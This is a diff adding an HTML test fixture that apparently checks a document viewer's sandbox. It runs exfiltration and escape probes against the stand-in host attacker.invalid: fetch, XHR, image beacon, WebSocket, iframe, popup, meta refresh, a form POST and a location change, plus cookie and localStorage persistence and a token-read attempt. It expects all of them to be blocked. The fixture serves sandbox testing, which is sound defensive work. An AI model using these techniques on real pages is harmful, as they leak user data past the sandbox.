@@ -1,0 +1,133 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="bugbook-artifact" content="1">
+<meta name="bugbook-title" content="Hostile Artifact — escape-attempt fixture">
+<meta name="bugbook-generator" content="bugbook-tests/fixture">
+</head>
+<body>
+<h1>Hostile artifact fixture</h1>
+<p>Every probe below must report <strong>blocked</strong> (except the data-URI control).</p>
+<form id="exfil-form" action="https://attacker.invalid/collect" method="POST">
+  <input type="hidden" name="d" value="exfil">
+</form>
+<pre id="results">running…</pre>
+<script>
+(function () {
+  "use strict";
+  const results = {};
+  const REMOTE = "https://attacker.invalid";
+
+  function record(name, value) { results[name] = value; }
+
+  function withTimeout(promise, ms) {
+    return Promise.race([
+      promise,
+      new Promise(resolve => setTimeout(() => resolve("blocked"), ms)),
+    ]);
+  }
+
+  // --- Parallel, non-navigating probes ---------------------------------
+  const parallel = [];
+
+  parallel.push(withTimeout(
+    fetch(REMOTE + "/fetch").then(() => "allowed").catch(() => "blocked"), 1500
+  ).then(v => record("fetch-https", v)));
+
+  parallel.push(withTimeout(new Promise(resolve => {
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open("GET", REMOTE + "/xhr");
+      xhr.onload = () => resolve("allowed");
+      xhr.onerror = () => resolve("blocked");
+      xhr.send();
+    } catch (e) { resolve("blocked"); }
+  }), 1500).then(v => record("xhr-https", v)));
+
+  parallel.push(withTimeout(new Promise(resolve => {
+    const img = new Image();
+    img.onload = () => resolve("allowed");
+    img.onerror = () => resolve("blocked");
+    img.src = REMOTE + "/beacon.gif";
+  }), 1500).then(v => record("img-beacon", v)));
+
+  parallel.push(withTimeout(new Promise(resolve => {
+    try {
+      const ws = new WebSocket("wss://attacker.invalid/ws");
+      ws.onopen = () => resolve("allowed");
+      ws.onerror = () => resolve("blocked");
+    } catch (e) { resolve("blocked"); }
+  }), 1500).then(v => record("websocket", v)));
+
+  parallel.push(withTimeout(new Promise(resolve => {
+    const frame = document.createElement("iframe");
+    frame.onload = () => resolve("allowed");
+    frame.src = REMOTE + "/frame";
+    document.body.appendChild(frame);
+  }), 1200).then(v => record("iframe-https", v)));
+
+  // Sibling-token read: a fabricated token must be refused by the handler
+  // (and connect-src 'none' blocks the fetch anyway).
+  parallel.push(withTimeout(
+    fetch("bugbook-artifact://a/00000000-0000-0000-0000-000000000000")
+      .then(() => "allowed").catch(() => "blocked"), 1500
+  ).then(v => record("sibling-token-read", v)));
+
+  // window.open must never produce a window.
+  try {
+    const w = window.open(REMOTE + "/popup");
+    record("window-open", w === null ? "blocked" : "allowed");
+  } catch (e) { record("window-open", "blocked"); }
+
+  // Persistence: anything surviving from a previous session means the data
+  // store leaked. Write after reading so a second run would detect it.
+  try {
+    const prior = window.localStorage.getItem("hostile-persist");
+    record("persistence-localStorage", prior === null ? "blocked" : "allowed");
+    window.localStorage.setItem("hostile-persist", "1");
+  } catch (e) { record("persistence-localStorage", "blocked"); }
+  try {
+    const hadCookie = document.cookie.indexOf("hostile=1") !== -1;
+    record("persistence-cookie", hadCookie ? "allowed" : "blocked");
+    document.cookie = "hostile=1";
+  } catch (e) { record("persistence-cookie", "blocked"); }
+
+  // Control: data-URI images are allowed by CSP (img-src data:) — proves the
+  // harness can observe a successful load.
+  parallel.push(withTimeout(new Promise(resolve => {
+    const img = new Image();
+    img.onload = () => resolve("allowed");
+    img.onerror = () => resolve("blocked");
+    img.src = "data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==";
+  }), 1500).then(v => record("control-img-data", v)));
+
+  // --- Serialized navigation probes (if any succeeds the page unloads and
+  // __probesComplete never appears — the native test treats that as failure).
+  function liveAfter(action, ms) {
+    return new Promise(resolve => {
+      try { action(); } catch (e) { /* throw = blocked */ }
+      setTimeout(() => resolve("blocked"), ms);
+    });
+  }
+
+  Promise.all(parallel)
+    .then(() => liveAfter(() => {
+      const meta = document.createElement("meta");
+      meta.httpEquiv = "refresh";
+      meta.content = "0;url=" + REMOTE + "/refresh";
+      document.head.appendChild(meta);
+    }, 700).then(v => record("meta-refresh", v)))
+    .then(() => liveAfter(() => document.getElementById("exfil-form").submit(), 700)
+      .then(v => record("form-action", v)))
+    .then(() => liveAfter(() => { window.location.href = REMOTE + "/loc"; }, 700)
+      .then(v => record("location-assign", v)))
+    .then(() => {
+      window.__results = results;
+      window.__probesComplete = true;
+      document.getElementById("results").textContent = JSON.stringify(results, null, 2);
+    });
+})();
+</script>
+</body>
+</html>
